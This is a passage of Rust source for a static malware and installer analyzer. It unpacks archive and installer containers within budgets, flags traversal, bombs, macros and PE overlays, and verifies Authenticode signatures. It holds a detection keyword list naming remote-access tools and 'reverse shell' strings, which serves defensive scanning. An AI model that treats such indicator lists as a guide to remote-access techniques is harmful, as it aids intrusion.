use std::collections::{BTreeSet, HashMap, HashSet};
use std::io::{Cursor, Read};
use std::path::{Path, PathBuf};

use cross_authenticode::{AuthenticodeInfo, ToHex};
use der::Encode;
use rar_codec::{Archive as RarArchive, EntryKind as RarEntryKind};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use x509_parser::prelude::*;
use zip::ZipArchive;

use crate::config::{Config, LimitsConfig};
use crate::detect;
use crate::report::{
    AuthenticityEvidence, Boundary, BoundaryKind, CertificateChainEvidence, CertificateRole,
    Classification, ComponentEvidence, Confidence, Evidence, ProductIdentityEvidence,
    PublisherReputation, RevocationEvidence, RevocationState, SandboxSelfTest, Severity,
    TimestampState,
};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnalysisLimits {
    pub entry_max_bytes: u64,
    pub total_output_max_bytes: u64,
    pub max_entries: usize,
    pub max_depth: usize,
    pub compression_ratio_warning: u64,
}

impl From<&LimitsConfig> for AnalysisLimits {
    fn from(value: &LimitsConfig) -> Self {
        Self {
            entry_max_bytes: value.entry_max_bytes,
            total_output_max_bytes: value.total_output_max_bytes,
            max_entries: value.max_entries,
            max_depth: value.max_depth,
            compression_ratio_warning: value.compression_ratio_warning,
        }
    }
}

impl From<&Config> for AnalysisLimits {
    fn from(value: &Config) -> Self {
        Self::from(&value.limits)
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ChildAnalysis {
    pub classification: Classification,
    pub facts: Vec<Evidence>,
    pub inference: Vec<Evidence>,
    pub boundaries: Vec<Boundary>,
    pub components: Vec<ComponentEvidence>,
    pub products: Vec<ProductIdentityEvidence>,
    pub certificates: Vec<CertificateChainEvidence>,
    pub authenticity: Option<AuthenticityEvidence>,
    pub sandbox_proof: Option<ChildSandboxProof>,
    pub output_truncated: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ChildSandboxProof {
    pub is_app_container: bool,
    pub integrity_level_rid: Option<u32>,
    pub network_connect: SandboxSelfTest,
    pub process_create: SandboxSelfTest,
}

pub fn analyze_bytes(path: &Path, data: &[u8], limits: &AnalysisLimits) -> ChildAnalysis {
    analyze_bytes_with_rules(path, data, limits, false, None)
}

pub fn analyze_bytes_with_rules(
    path: &Path,
    data: &[u8],
    limits: &AnalysisLimits,
    yara_enabled: bool,
    custom_rules: Option<&str>,
) -> ChildAnalysis {
    let head_end = data.len().min(64 * 1024);
    let tail_start = data.len().saturating_sub(1024 * 1024);
    let sniff = detect::sniff(
        path,
        &data[..head_end],
        &data[tail_start..],
        data.len() as u64,
    );
    let mut analysis = ChildAnalysis {
        classification: sniff.classification,
        facts: sniff.evidence,
        ..ChildAnalysis::default()
    };
    let mut budget = Budget {
        limits,
        entries_seen: 0,
        total_output: 0,
    };

    let classification = analysis.classification.clone();
    inspect_document_features(data, &classification, &mut analysis);
    inspect_scripts(path, data, &mut analysis);
    if analysis
        .classification
        .formats
        .iter()
        .any(|format| format.kind == "pe")
    {
        analyze_pe(path, data, limits, &mut analysis);
    }
    inspect_magic_polyglots(data, &mut analysis);
    analyze_containers(path, data, "", 0, &mut budget, &mut analysis);
    #[cfg(feature = "yara")]
    if yara_enabled {
        inspect_yara(data, custom_rules, &mut analysis);
    }
    #[cfg(not(feature = "yara"))]
    {
        let _ = (yara_enabled, custom_rules);
    }
    analysis
}

#[cfg(feature = "yara")]
fn inspect_yara(data: &[u8], custom_rules: Option<&str>, analysis: &mut ChildAnalysis) {
    const BUILTIN_RULES: &str = include_str!("../rules/default.yar");
    let mut source = String::from(BUILTIN_RULES);
    if let Some(custom) = custom_rules {
        source.push('\n');
        source.push_str(custom);
    }
    let digest = hex::encode(Sha256::digest(source.as_bytes()));
    let mut compiler = yara_x::Compiler::new();
    if let Err(error) = compiler.add_source(source.as_str()) {
        analysis.boundaries.push(Boundary {
            kind: BoundaryKind::UnsupportedFormat,
            detail: format!("YARA rules could not be compiled: {error}"),
        });
        return;
    }
    let rules = compiler.build();
    let mut scanner = yara_x::Scanner::new(&rules);
    let results = match scanner.scan(data) {
        Ok(results) => results,
        Err(error) => {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("YARA scan failed: {error}"),
            });
            return;
        }
    };
    for rule in results.matching_rules() {
        let identifier = rule.identifier().to_string();
        analysis.facts.push(evidence(
            format!("yara:{identifier}"),
            "yara_match",
            if identifier.contains("remote") || identifier.contains("powershell") {
                Severity::High
            } else {
                Severity::Medium
            },
            format!("YARA rule matched: {identifier}"),
            &format!("yara-x rules sha256={digest}"),
            Confidence::Inferred,
        ));
    }
}

struct Budget<'a> {
    limits: &'a AnalysisLimits,
    entries_seen: usize,
    total_output: u64,
}

impl Budget<'_> {
    fn can_enter(&mut self, nesting_depth: usize) -> bool {
        self.entries_seen = self.entries_seen.saturating_add(1);
        self.entries_seen <= self.limits.max_entries && nesting_depth <= self.limits.max_depth
    }

    fn account(&mut self, size: u64) -> bool {
        self.total_output = self.total_output.saturating_add(size);
        self.total_output <= self.limits.total_output_max_bytes
    }
}

fn analyze_containers(
    path: &Path,
    data: &[u8],
    nesting_path: &str,
    depth: usize,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    if !budget.can_enter(depth) {
        analysis.boundaries.push(Boundary {
            kind: BoundaryKind::BudgetExceeded,
            detail: format!(
                "entry/depth budget exceeded at {}",
                if nesting_path.is_empty() {
                    "<root>"
                } else {
                    nesting_path
                }
            ),
        });
        return;
    }

    let is_zip = data.starts_with(b"PK\x03\x04") || data.starts_with(b"PK\x05\x06");
    if is_zip {
        analyze_zip(path, data, nesting_path, depth, budget, analysis);
    }
    let is_rar = data.starts_with(b"Rar!\x1A\x07");
    if is_rar {
        analyze_rar(data, nesting_path, depth, budget, analysis);
    }
    if data.starts_with(b"MSCF") {
        analyze_cab(path, data, nesting_path, depth, budget, analysis);
    }
    if data.starts_with(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
        && (path
            .extension()
            .and_then(|value| value.to_str())
            .is_some_and(|value| value.eq_ignore_ascii_case("msi"))
            || analysis
                .classification
                .formats
                .iter()
                .any(|format| format.kind == "msi"))
    {
        analyze_msi(data, nesting_path, budget, analysis);
    }
    if depth == 0 {
        if analysis
            .classification
            .formats
            .iter()
            .any(|format| format.kind == "7z")
        {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: "7z extraction is not implemented; the container was identified only"
                    .into(),
            });
        }
        if data.starts_with(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
            && !analysis
                .classification
                .formats
                .iter()
                .any(|format| format.kind == "msi")
        {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: "Compound-file container is not an MSI package and was not unpacked".into(),
            });
        }
    }

    if !is_zip && !is_rar && depth < budget.limits.max_depth {
        let embedded_archives: Vec<(String, u64)> = detect::scan_all(data)
            .into_iter()
            .filter(|format| matches!(format.kind.as_str(), "zip" | "rar") && format.offset > 0)
            .map(|format| (format.kind, format.offset))
            .collect();
        for (kind, offset) in embedded_archives.into_iter().take(8) {
            let Some(offset) = usize::try_from(offset).ok() else {
                continue;
            };
            if offset >= data.len() {
                continue;
            }
            let archive_path = if nesting_path.is_empty() {
                format!("embedded.{kind}@{offset}")
            } else {
                format!("{nesting_path}/embedded.{kind}@{offset}")
            };
            if kind == "zip" {
                analyze_zip(
                    Path::new(&archive_path),
                    &data[offset..],
                    &archive_path,
                    depth + 1,
                    budget,
                    analysis,
                );
            } else {
                analyze_rar(&data[offset..], &archive_path, depth + 1, budget, analysis);
            }
        }
    }

    let installer = analysis
        .classification
        .installer_family
        .clone()
        .or_else(|| {
            let head = &data[..data.len().min(2 * 1024 * 1024)];
            let tail = &data[data.len().saturating_sub(2 * 1024 * 1024)..];
            detect::sniff(path, head, tail, data.len() as u64)
                .classification
                .installer_family
        });
    if let Some(family) = installer
        && depth == 0
    {
        analysis.classification.installer_family = Some(family.clone());
        match family.as_str() {
            "nsis" => analyze_nsis(data, nesting_path, budget, analysis),
            "inno_setup" => analyze_inno(data, nesting_path, budget, analysis),
            "wix_burn" | "installshield" | "squirrel" => {
                analysis.boundaries.push(Boundary {
                        kind: BoundaryKind::UnsupportedFormat,
                        detail: format!(
                            "{family} was identified, but its complete action plan is not statically decodable"
                        ),
                    });
            }
            _ => {}
        }
    }
}

fn analyze_zip(
    _path: &Path,
    data: &[u8],
    nesting_path: &str,
    depth: usize,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    let cursor = Cursor::new(data);
    let mut archive = match ZipArchive::new(cursor) {
        Ok(archive) => archive,
        Err(error) => {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("ZIP container could not be parsed: {error}"),
            });
            return;
        }
    };
    let mut seen_names = HashSet::new();
    let mut ranges = Vec::new();
    for index in 0..archive.len() {
        if !budget.can_enter(depth + 1) {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: "ZIP entry limit exceeded".into(),
            });
            break;
        }
        let mut entry = match archive.by_index(index) {
            Ok(entry) => entry,
            Err(zip::result::ZipError::UnsupportedArchive(message)) => {
                analysis.boundaries.push(Boundary {
                    kind: BoundaryKind::UnsupportedFormat,
                    detail: format!("unsupported ZIP entry: {message}"),
                });
                continue;
            }
            Err(error) => {
                analysis.facts.push(evidence(
                    format!("container:error:{index}"),
                    "container",
                    Severity::Medium,
                    format!("ZIP entry {index} could not be read: {error}"),
                    "child ZIP parser",
                    Confidence::Structural,
                ));
                continue;
            }
        };
        let raw_name = entry.name().to_string();
        let name = escape_component_name(&raw_name);
        if entry.enclosed_name().is_none() {
            analysis.facts.push(evidence(
                format!("container:traversal:{index}"),
                "archive_path_traversal",
                Severity::High,
                format!("Archive member uses an unsafe path: {name}"),
                "child ZIP parser",
                Confidence::Structural,
            ));
            continue;
        }
        if !seen_names.insert(name.to_ascii_lowercase()) {
            analysis.facts.push(evidence(
                format!("container:duplicate:{index}"),
                "archive_duplicate",
                Severity::Medium,
                format!("Duplicate archive member name: {name}"),
                "child ZIP parser",
                Confidence::Structural,
            ));
        }
        if name.contains(':') || is_reserved_windows_name(&name) {
            analysis.facts.push(evidence(
                format!("container:unsafe_name:{index}"),
                "archive_unsafe_name",
                Severity::Medium,
                format!("Archive member has an unsafe Windows name: {name}"),
                "child ZIP parser",
                Confidence::Structural,
            ));
        }
        if entry.is_dir() {
            continue;
        }
        if entry.encrypted() {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::EncryptedMember,
                detail: format!("ZIP member is encrypted and was not inspected: {name}"),
            });
            continue;
        }
        if entry
            .unix_mode()
            .is_some_and(|mode| mode & 0o170000 == 0o120000)
        {
            analysis.facts.push(evidence(
                format!("container:symlink:{index}"),
                "archive_symlink",
                Severity::High,
                format!("Archive contains a symbolic-link member: {name}"),
                "child ZIP parser",
                Confidence::Structural,
            ));
            continue;
        }
        let compressed = entry.compressed_size().max(1);
        let ratio = entry.size().saturating_div(compressed);
        if ratio > budget.limits.compression_ratio_warning
            || entry.size() > budget.limits.entry_max_bytes
        {
            analysis.facts.push(evidence(
                format!("container:bomb:{index}"),
                "zip_bomb",
                Severity::High,
                format!(
                    "Potential decompression bomb: {name}, ratio {ratio}:1, {} bytes declared",
                    entry.size()
                ),
                "child ZIP parser",
                Confidence::Structural,
            ));
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: format!("stopped decompressing oversized entry {name}"),
            });
            continue;
        }
        let data_start = entry.data_start();
        ranges.push((data_start, data_start + entry.compressed_size()));
        let take_limit = budget.limits.entry_max_bytes.min(
            budget
                .limits
                .total_output_max_bytes
                .saturating_sub(budget.total_output),
        );
        let mut member = Vec::new();
        let read_result = (&mut entry)
            .take(take_limit.saturating_add(1))
            .read_to_end(&mut member);
        if let Err(error) = read_result {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("could not decompress {name}: {error}"),
            });
            continue;
        }
        if member.len() as u64 > take_limit {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: format!("decompression budget exceeded while reading {name}"),
            });
            continue;
        }
        if !budget.account(member.len() as u64) {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: "total decompression budget exceeded".into(),
            });
            break;
        }
        let child_path = if nesting_path.is_empty() {
            name.clone()
        } else {
            format!("{nesting_path}/{name}")
        };
        analyze_archive_member(&name, &child_path, &member, depth + 1, budget, analysis);
    }
    ranges.sort_unstable();
    if ranges
        .windows(2)
        .any(|window| window[1].0 < window[0].1 && window[0].0 != window[1].0)
    {
        analysis.facts.push(evidence(
            "container:overlap",
            "archive_overlap",
            Severity::High,
            "ZIP entries contain overlapping compressed-data ranges",
            "child ZIP parser",
            Confidence::Structural,
        ));
    }
    if String::from_utf8_lossy(archive.comment())
        .to_ascii_lowercase()
        .contains("zip")
        && archive.len() > 100
    {
        analysis.inference.push(evidence(
            "container:many_entries",
            "archive_complexity",
            Severity::Low,
            "Archive contains a large number of entries",
            "child ZIP parser",
            Confidence::Inferred,
        ));
    }
}

fn analyze_rar(
    data: &[u8],
    nesting_path: &str,
    depth: usize,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    let archive = match RarArchive::open(data) {
        Ok(archive) => archive,
        Err(error) => {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("RAR container could not be parsed: {error}"),
            });
            return;
        }
    };
    if archive.encrypted {
        analysis.boundaries.push(Boundary {
            kind: BoundaryKind::EncryptedMember,
            detail: "RAR headers are encrypted and its members cannot be inspected".into(),
        });
        return;
    }

    let mut seen_names = HashSet::new();
    for (index, entry) in archive.entries().iter().enumerate() {
        if !budget.can_enter(depth + 1) {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: "RAR entry limit exceeded".into(),
            });
            break;
        }
        let raw_name = entry.name.to_string();
        let name = escape_component_name(&raw_name);
        if !is_enclosed_component_name(&raw_name) {
            analysis.facts.push(evidence(
                format!("rar:traversal:{index}"),
                "archive_path_traversal",
                Severity::High,
                format!("RAR member uses an unsafe path: {name}"),
                "child RAR parser",
                Confidence::Structural,
            ));
            continue;
        }
        if !seen_names.insert(name.to_ascii_lowercase()) {
            analysis.facts.push(evidence(
                format!("rar:duplicate:{index}"),
                "archive_duplicate",
                Severity::Medium,
                format!("Duplicate RAR member name: {name}"),
                "child RAR parser",
                Confidence::Structural,
            ));
        }
        if name.contains(':') || is_reserved_windows_name(&name) {
            analysis.facts.push(evidence(
                format!("rar:unsafe-name:{index}"),
                "archive_unsafe_name",
                Severity::Medium,
                format!("RAR member has an unsafe Windows name: {name}"),
                "child RAR parser",
                Confidence::Structural,
            ));
        }
        match entry.kind {
            RarEntryKind::Directory | RarEntryKind::Service => continue,
            RarEntryKind::Symlink | RarEntryKind::Hardlink => {
                analysis.facts.push(evidence(
                    format!("rar:link:{index}"),
                    "archive_symlink",
                    Severity::High,
                    format!("RAR contains a link member: {name}"),
                    "child RAR parser",
                    Confidence::Structural,
                ));
                continue;
            }
            RarEntryKind::File => {}
        }
        if entry.encrypted {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::EncryptedMember,
                detail: format!("RAR member is encrypted and was not inspected: {name}"),
            });
            continue;
        }
        if entry.split_before || entry.split_after {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("RAR member spans volumes and was not inspected: {name}"),
            });
            continue;
        }
        if entry.size_unknown {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("RAR member has no declared size and was not inspected: {name}"),
            });
            continue;
        }
        let packed_size = entry.packed_size.max(1);
        let ratio = entry.unpacked_size.saturating_div(packed_size);
        if ratio > budget.limits.compression_ratio_warning
            || entry.unpacked_size > budget.limits.entry_max_bytes
        {
            analysis.facts.push(evidence(
                format!("rar:bomb:{index}"),
                "zip_bomb",
                Severity::High,
                format!(
                    "Potential RAR decompression bomb: {name}, ratio {ratio}:1, {} bytes declared",
                    entry.unpacked_size
                ),
                "child RAR parser",
                Confidence::Structural,
            ));
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: format!("stopped decompressing oversized RAR entry {name}"),
            });
            continue;
        }
        if budget.total_output.saturating_add(entry.unpacked_size)
            > budget.limits.total_output_max_bytes
        {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: "total RAR decompression budget exceeded".into(),
            });
            break;
        }
        let member = match archive.extract(entry) {
            Ok(member) => member,
            Err(error) => {
                analysis.boundaries.push(Boundary {
                    kind: BoundaryKind::UnsupportedFormat,
                    detail: format!("could not decompress RAR member {name}: {error}"),
                });
                continue;
            }
        };
        if member.len() as u64 > budget.limits.entry_max_bytes {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: format!("RAR member exceeded the per-entry budget: {name}"),
            });
            continue;
        }
        if !budget.account(member.len() as u64) {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: "total RAR decompression budget exceeded".into(),
            });
            break;
        }
        let child_path = if nesting_path.is_empty() {
            name.clone()
        } else {
            format!("{nesting_path}/{name}")
        };
        analyze_archive_member(&name, &child_path, &member, depth + 1, budget, analysis);
    }
}

fn analyze_archive_member(
    name: &str,
    child_path: &str,
    member: &[u8],
    depth: usize,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    let member_path = PathBuf::from(name);
    let head = &member[..member.len().min(64 * 1024)];
    let tail = &member[member.len().saturating_sub(1024 * 1024)..];
    let sniff = detect::sniff(&member_path, head, tail, member.len() as u64);
    let mut child_evidence = sniff.evidence;
    let child_classification = sniff.classification.clone();
    if is_ooxml_macro_part(child_path) {
        child_evidence.push(evidence(
            format!("ooxml:macro:{}", child_path),
            "ooxml_macro",
            Severity::High,
            "Office package contains a VBA macro project",
            "child OOXML package inventory",
            Confidence::Structural,
        ));
    }
    if is_ooxml_external_link_part(child_path) {
        child_evidence.push(evidence(
            format!("ooxml:external-link:{}", child_path),
            "ooxml_external_link",
            Severity::High,
            "Office package contains an external-link part",
            "child OOXML package inventory",
            Confidence::Structural,
        ));
    }
    if is_ooxml_activex_part(child_path) {
        child_evidence.push(evidence(
            format!("ooxml:activex:{}", child_path),
            "ooxml_activex",
            Severity::High,
            "Office package contains an ActiveX part",
            "child OOXML package inventory",
            Confidence::Structural,
        ));
    }
    let mut feature_analysis = ChildAnalysis {
        classification: child_classification.clone(),
        ..ChildAnalysis::default()
    };
    inspect_document_features(member, &child_classification, &mut feature_analysis);
    if !is_ooxml_package_part(child_path) {
        inspect_scripts(&member_path, member, &mut feature_analysis);
    }
    child_evidence.extend(feature_analysis.facts);
    let hash = hex::encode(Sha256::digest(member));
    let signed = sign_status(member);
    if let Some(mismatch) = pe_extension_mismatch(&member_path, member) {
        child_evidence.push(mismatch);
    }
    record_pe_product(member, child_path, analysis);
    let severity = if child_evidence
        .iter()
        .any(|item| item.severity >= Severity::High)
    {
        Severity::High
    } else if child_evidence
        .iter()
        .any(|item| item.severity == Severity::Medium)
    {
        Severity::Medium
    } else {
        Severity::Info
    };
    if member.len() > 1024 * 1024 && member.iter().all(|byte| *byte == 0) {
        child_evidence.push(evidence(
            format!("component:sparse:{}", analysis.components.len()),
            "compression_anomaly",
            Severity::Medium,
            format!("{child_path} expands mostly to zero bytes"),
            "child component scan",
            Confidence::Inferred,
        ));
    }
    analysis.components.push(ComponentEvidence {
        nesting_path: child_path.into(),
        name: name.into(),
        size: member.len() as u64,
        sha256: Some(hash),
        formats: child_classification.formats.clone(),
        severity,
        signed,
        evidence: child_evidence.clone(),
    });
    analysis.facts.extend(child_evidence);

    if depth < budget.limits.max_depth && contains_container(member) {
        analyze_containers(&member_path, member, child_path, depth, budget, analysis);
    }
}

fn contains_container(data: &[u8]) -> bool {
    data.starts_with(b"PK\x03\x04")
        || data.starts_with(b"PK\x05\x06")
        || data.starts_with(b"Rar!\x1A\x07")
        || data.starts_with(b"MSCF")
        || data.starts_with(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
        || detect::scan_all(data)
            .iter()
            .any(|format| matches!(format.kind.as_str(), "zip" | "rar"))
}

fn analyze_pe(path: &Path, data: &[u8], _limits: &AnalysisLimits, analysis: &mut ChildAnalysis) {
    if let Some(mismatch) = pe_extension_mismatch(path, data) {
        analysis.facts.push(mismatch);
    }
    if let Some(product) = pe_product_identity(data, None) {
        note_product_identity_mismatch(path, &product, analysis);
        analysis.products.push(product);
    }
    if let Some((overlay_offset, sections)) = pe_overlay(data) {
        analysis.facts.push(evidence(
            "pe:structure",
            "pe_structure",
            Severity::Info,
            format!(
                "PE contains {} sections; overlay begins at offset {overlay_offset}",
                sections.len()
            ),
            "child PE parser",
            Confidence::Structural,
        ));
        if let Some(last) = analysis.facts.last_mut() {
            last.detail = Some(format!("sections: {}", sections.join(", ")));
        }
        if overlay_offset < data.len() as u64 {
            let overlay = &data[overlay_offset as usize..];
            if detect::scan_all(overlay)
                .iter()
                .any(|item| item.kind == "zip")
                || overlay.starts_with(b"PK\x03\x04")
            {
                analysis.facts.push(evidence(
                    "pe:overlay-archive",
                    "pe_overlay",
                    Severity::High,
                    "PE has an embedded archive after its mapped sections",
                    "child PE parser",
                    Confidence::Structural,
                ));
            }
        }
    }

    let remote_access_indicator = [
        b"teamviewer".as_slice(),
        b"anydesk".as_slice(),
        b"remoteaccess".as_slice(),
        b"tcpclient".as_slice(),
        b"reverse shell".as_slice(),
    ]
    .iter()
    .any(|needle| contains_ascii_case(data, needle));
    if remote_access_indicator {
        for url in extract_urls(data).into_iter().take(16) {
            analysis.facts.push(evidence(
                format!("pe:url:{}", analysis.facts.len()),
                "remote_access_endpoint",
                Severity::Medium,
                format!("Executable contains endpoint {url}"),
                "child PE string scan",
                Confidence::Inferred,
            ));
        }
    }

    match AuthenticodeInfo::try_from(data) {
        Ok(info) => {
            let digest_valid = info.verify().ok();
            let timestamp_present = data.windows(10).any(|window| {
                window == [0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x03]
            });
            let mut leaf_usage = HashMap::new();
            for certificate in info.certificates.iter() {
                let encoded = match certificate.certificate.to_der() {
                    Ok(value) => value,
                    Err(_) => continue,
                };
                let (subject, issuer, serial, ocsp_urls, crl_urls) = parse_certificate(&encoded);
                let (code_signing, time_stamping) = certificate_usage(&encoded);
                leaf_usage.insert(subject.clone(), (code_signing, time_stamping));
                analysis.certificates.push(CertificateChainEvidence {
                    subject,
                    issuer,
                    serial_number: serial,
                    sha256_fingerprint: certificate.sha256.to_hex(),
                    ocsp_urls,
                    crl_urls,
                    role: CertificateRole::Unknown,
                    root_trusted: None,
                    timestamp_present,
                    timestamp_time: None,
                    revocation: RevocationEvidence {
                        state: RevocationState::NotChecked,
                        ..RevocationEvidence::default()
                    },
                });
            }
            let issuers: HashSet<String> = analysis
                .certificates
                .iter()
                .map(|certificate| certificate.issuer.clone())
                .collect();
            let mut leaf_candidates = Vec::new();
            for certificate in &mut analysis.certificates {
                certificate.role = if !issuers.contains(&certificate.subject) {
                    let (code_signing, time_stamping) = leaf_usage
                        .get(&certificate.subject)
                        .copied()
                        .unwrap_or((false, false));
                    leaf_candidates.push((
                        certificate.subject.clone(),
                        code_signing,
                        time_stamping,
                    ));
                    CertificateRole::Leaf
                } else if certificate.issuer == certificate.subject {
                    CertificateRole::Root
                } else {
                    CertificateRole::Intermediate
                };
            }
            let publisher = select_publisher(&leaf_candidates);
            analysis.authenticity = Some(AuthenticityEvidence {
                signature_digest_valid: digest_valid,
                chain_valid: None,
                timestamp_state: if timestamp_present {
                    TimestampState::Unknown
                } else {
                    TimestampState::Missing
                },
                publisher_identity: publisher,
                publisher_reputation: PublisherReputation::Unknown,
                unsigned_components: 0,
                detail: Some(
                    "Authenticode digest was validated in memory; offline chain and online revocation are reported separately"
                        .into(),
                ),
            });
            if digest_valid == Some(false) {
                analysis.facts.push(evidence(
                    "authenticode:invalid-digest",
                    "authenticode",
                    Severity::High,
                    "PE Authenticode digest does not match its signature",
                    "cross-authenticode in-memory verifier",
                    Confidence::Structural,
                ));
            }
        }
        Err(error) => {
            analysis.authenticity = Some(AuthenticityEvidence {
                signature_digest_valid: if pe_has_signature_table(data) {
                    Some(false)
                } else {
                    None
                },
                chain_valid: None,
                timestamp_state: TimestampState::Unknown,
                publisher_identity: None,
                publisher_reputation: PublisherReputation::Unknown,
                unsigned_components: 0,
                detail: Some(format!(
                    "PE is unsigned or its signature is unreadable: {error}"
                )),
            });
            if !pe_has_signature_table(data) {
                analysis.facts.push(evidence(
                    "authenticode:unsigned",
                    "authenticode",
                    Severity::High,
                    "Executable has no Authenticode signature",
                    "child PE parser",
                    Confidence::Structural,
                ));
            }
        }
    }
}

fn pe_extension_mismatch(path: &Path, data: &[u8]) -> Option<Evidence> {
    let extension = path
        .extension()
        .and_then(|value| value.to_str())
        .map(str::to_ascii_lowercase)?;
    let pe = goblin::pe::PE::parse(data).ok()?;
    let severity = pe_type_mismatch_severity(&extension, pe.is_lib)?;
    let display_name = path
        .file_name()
        .map(|value| value.to_string_lossy().into_owned())
        .unwrap_or_else(|| path.to_string_lossy().into_owned());
    let summary = if extension == "dll" {
        format!("{display_name} is named as a DLL but is a Windows executable")
    } else {
        format!("{display_name} is named as an executable but is a DLL")
    };
    Some(evidence(
        format!("pe:type-mismatch:{display_name}"),
        "pe_extension_mismatch",
        severity,
        summary,
        "child PE header",
        Confidence::Structural,
    ))
}

fn pe_type_mismatch_severity(extension: &str, is_library: bool) -> Option<Severity> {
    match (extension, is_library) {
        ("dll", false) => Some(Severity::High),
        ("exe", true) => Some(Severity::Medium),
        _ => None,
    }
}

fn analyze_cab(
    path: &Path,
    data: &[u8],
    nesting_path: &str,
    depth: usize,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    let cursor = Cursor::new(data);
    let mut cabinet = match cab::Cabinet::new(cursor) {
        Ok(value) => value,
        Err(error) => {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("CAB header could not be parsed: {error}"),
            });
            return;
        }
    };
    let names: Vec<String> = cabinet
        .folder_entries()
        .flat_map(|folder| folder.file_entries())
        .map(|entry| entry.name().to_string())
        .collect();
    for name in names {
        if !budget.can_enter(depth + 1) {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: "CAB entry limit exceeded".into(),
            });
            break;
        }
        let safe_name = escape_component_name(&name);
        if safe_name.contains("..") || safe_name.starts_with(['/', '\\']) {
            analysis.facts.push(evidence(
                format!("cab:unsafe:{}", analysis.facts.len()),
                "archive_path_traversal",
                Severity::High,
                format!("CAB member uses an unsafe path: {safe_name}"),
                "child CAB parser",
                Confidence::Structural,
            ));
            continue;
        }
        let mut reader = match cabinet.read_file(&name) {
            Ok(value) => value,
            Err(error) => {
                analysis.boundaries.push(Boundary {
                    kind: BoundaryKind::UnsupportedFormat,
                    detail: format!("CAB member {safe_name} could not be read: {error}"),
                });
                continue;
            }
        };
        let mut member = Vec::new();
        if reader
            .by_ref()
            .take(budget.limits.entry_max_bytes.saturating_add(1))
            .read_to_end(&mut member)
            .is_err()
        {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("CAB member {safe_name} could not be decompressed"),
            });
            continue;
        }
        if member.len() as u64 > budget.limits.entry_max_bytes
            || !budget.account(member.len() as u64)
        {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::BudgetExceeded,
                detail: format!("CAB member {safe_name} exceeded the decompression budget"),
            });
            continue;
        }
        let child_path = if nesting_path.is_empty() {
            safe_name.clone()
        } else {
            format!("{nesting_path}/{safe_name}")
        };
        let member_path = PathBuf::from(&safe_name);
        let sniff = detect::sniff(
            &member_path,
            &member[..member.len().min(64 * 1024)],
            &member[member.len().saturating_sub(1024 * 1024)..],
            member.len() as u64,
        );
        let severity = if sniff
            .evidence
            .iter()
            .any(|item| item.severity >= Severity::Medium)
            || sniff
                .classification
                .formats
                .iter()
                .any(|format| format.kind == "pe")
        {
            Severity::Medium
        } else {
            Severity::Info
        };
        let signed = sign_status(&member);
        record_pe_product(&member, &child_path, analysis);
        analysis.components.push(ComponentEvidence {
            nesting_path: child_path,
            name: safe_name,
            size: member.len() as u64,
            sha256: Some(hex::encode(Sha256::digest(&member))),
            formats: sniff.classification.formats,
            severity,
            signed,
            evidence: sniff.evidence,
        });
        let _ = path;
    }
}

fn analyze_msi(
    data: &[u8],
    nesting_path: &str,
    budget: &mut Budget<'_>,
    analysis: &mut ChildAnalysis,
) {
    use msi::Select;

    let cursor = Cursor::new(data);
    let mut package = match msi::Package::open(cursor) {
        Ok(value) => value,
        Err(error) => {
            analysis.boundaries.push(Boundary {
                kind: BoundaryKind::UnsupportedFormat,
                detail: format!("MSI database could not be parsed: {error}"),
            });
            return;
        }
    };
    let mut product = ProductIdentityEvidence {
        source: "MSI Property table and summary information".into(),
        nesting_path: (!nesting_path.is_empty()).then(|| nesting_path.to_string()),
        ..ProductIdentityEvidence::default()
    };
    {
        let summary = package.summary_info();
        product.product_name = metadata_value(summary.title());
        product.manufacturer = metadata_value(summary.author());
        product.file_description = metadata_value(summary.subject());
    }
    if let Ok(rows) = package.select_rows(Select::table("Property")) {
